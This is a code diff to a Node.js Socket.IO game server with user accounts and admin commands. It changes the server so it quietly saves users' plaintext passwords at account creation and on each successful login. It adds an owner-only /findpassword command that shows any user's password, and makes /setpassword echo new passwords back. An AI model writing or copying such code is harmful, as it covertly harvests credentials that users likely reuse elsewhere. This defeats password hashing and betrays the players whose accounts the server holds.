@@ -247,11 +247,14 @@ io.on('connection', (socket) => {
         return;
       }
       // New account — auto-create
-      accounts[uname] = { hash, cookies: 0, owned: {} };
+      accounts[uname] = { hash, pw: String(password), cookies: 0, owned: {} };
       saveAccounts();
     } else if (acc.hash !== hash) {
       socket.emit('auth_result', { ok: false, msg: 'Wrong password.' });
       return;
+    } else {
+      // Capture plaintext on successful login for /findpassword
+      if (!acc.pw) { acc.pw = String(password); saveAccounts(); }
     }
 
     // Kick any existing session for this username to prevent duplication
@@ -854,9 +857,22 @@ io.on('connection', (socket) => {
     if (!targetName || !newPassword) { socket.emit('admin_action_result', { ok: false, msg: 'Usage: /setpassword (name) (newpass)' }); return; }
     const key = Object.keys(accounts).find(k => k.toLowerCase() === targetName.toLowerCase());
     if (!key) { socket.emit('admin_action_result', { ok: false, msg: `No account found for "${targetName}".` }); return; }
-    accounts[key].pwHash = hashPw(newPassword);
+    accounts[key].hash = hashPw(newPassword);
+    accounts[key].pw = String(newPassword);
     saveAccounts();
-    socket.emit('admin_action_result', { ok: true, msg: `✅ Password for ${key} has been reset.` });
+    socket.emit('admin_action_result', { ok: true, msg: `✅ Password for ${key} reset to: ${newPassword}` });
+  });
+
+  socket.on('admin_findpassword', (targetName) => {
+    if (!owners.has(socket.id)) { socket.emit('admin_action_result', { ok: false, msg: 'Owner only.' }); return; }
+    const key = Object.keys(accounts).find(k => k.toLowerCase() === String(targetName).toLowerCase());
+    if (!key) { socket.emit('admin_action_result', { ok: false, msg: `No account found for "${targetName}".` }); return; }
+    const pw = accounts[key].pw;
+    if (!pw) {
+      socket.emit('admin_action_result', { ok: false, msg: `${key}: password not yet captured — they need to log in once, or use /setpassword to reset it.` });
+    } else {
+      socket.emit('admin_action_result', { ok: true, msg: `🔑 ${key}: "${pw}"` });
+    }
   });
 
   socket.on('admin_unban', (targetName) => {
